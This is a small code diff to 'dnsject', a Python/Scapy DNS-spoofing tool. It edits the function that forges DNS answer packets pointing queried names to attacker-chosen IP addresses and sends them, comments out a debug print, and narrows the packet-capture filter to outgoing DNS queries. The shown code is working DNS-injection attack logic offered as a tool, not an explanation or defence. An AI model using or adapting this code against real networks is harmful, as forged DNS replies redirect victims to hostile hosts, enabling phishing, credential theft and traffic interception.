@@ -18,7 +18,7 @@ def spoofPacket(pkt):
 				/DNS(id=pkt[DNS].id, qr=1, ancount=1, aa=1, qd=pkt[DNS].qd,
 					an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10000, 
 						rdata=defSpoofIp if fullAttack else victims[pkt[DNSQR].qname]))
-		print spfPkt.command()
+		#print spfPkt.command()
 		send(spfPkt)
 
 parser = argparse.ArgumentParser(description="dnsject", add_help=False)
@@ -41,7 +41,7 @@ if args.h:
 			victims[key+"."] = value
 			
 #print victims
-bpf = "udp port 53"
+bpf = "udp dst port 53"
 if args.expression:
 	exp = " ".join(args.expression)
 	bpf = bpf + " and " + "(" + exp + ")" 
